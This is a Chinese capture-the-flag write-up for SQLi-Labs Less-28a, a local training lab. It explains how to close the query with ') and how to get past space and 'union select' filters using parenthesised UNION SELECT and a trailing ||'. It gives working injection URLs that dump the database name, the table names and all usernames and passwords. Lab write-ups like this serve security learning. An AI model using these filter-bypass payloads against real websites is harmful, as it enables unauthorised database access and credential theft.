【SQLi-Labs】Less-28a 括号绕过与对称闭合 Writeup

操作者：何芊宏 | 操作日期：2026.10.27 | 分类：CTF | 标签：SQLi-Labs, Web, SQL注入, 绕过过滤, 联合查询

1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入
  • 题目名称：Less-28a (GET - Trick with SELECT & UNION)
  • 提示：单引号+括号闭合，无报错回显，需使用括号绕过空格，双引号/单引号对称闭合。

2. 核心原理与绕过策略

本关卡是 Less-28 的变种，核心区别在于屏蔽了数据库的报错回显，只能使用联合查询（UNION SELECT）。

  • 闭合方式：后台 SQL 为 id=('$id')，需使用 ') 闭合。
  • 过滤机制：依然过滤了带空格的 union select 组合、空格及注释符。
  • 绕过方式：使用 union(select...) 阻断正则；使用 ||' 在末尾与后台原有的 ') LIMIT 0,1 缝合，形成合法的空字符串。

3. 操作步骤与解析

第一步：爆库名

输入 URL：?id=0')union(select(1),database(),3||'

回显现象：页面第 2 列显示 security。

第二步：爆表名

输入 URL：?id=0')union(select(1),group_concat(table_name),(3)from(information_schema.tables)where(table_schema=database())||'

回显现象：页面第 2 列显示 emails,referrers,uagents,users。

第三步：直接脱库

输入 URL：?id=0')union(select(1),group_concat(username,0x3a,password),(3)from(users)where(1=1)||'

回显现象：成功爆出所有账号密码，包含 admin:p@ssw0rd。

4. 踩坑记录与复盘

  • 必须使用闭合符：不能因为前几关数字型或单引号成功过，就省略 ')。这里的括号是原代码自带的，必须配对。
  • 无报错环境：遇到 mysql_error() 被注释掉的关卡，立刻放弃 extractvalue，老老实实算回显列数（本关是 3 列）。

5. 知识点总结

  • 多重过滤绕过：通过括号阻断空白字符匹配正则，通过逻辑运算（||）补全闭合符。
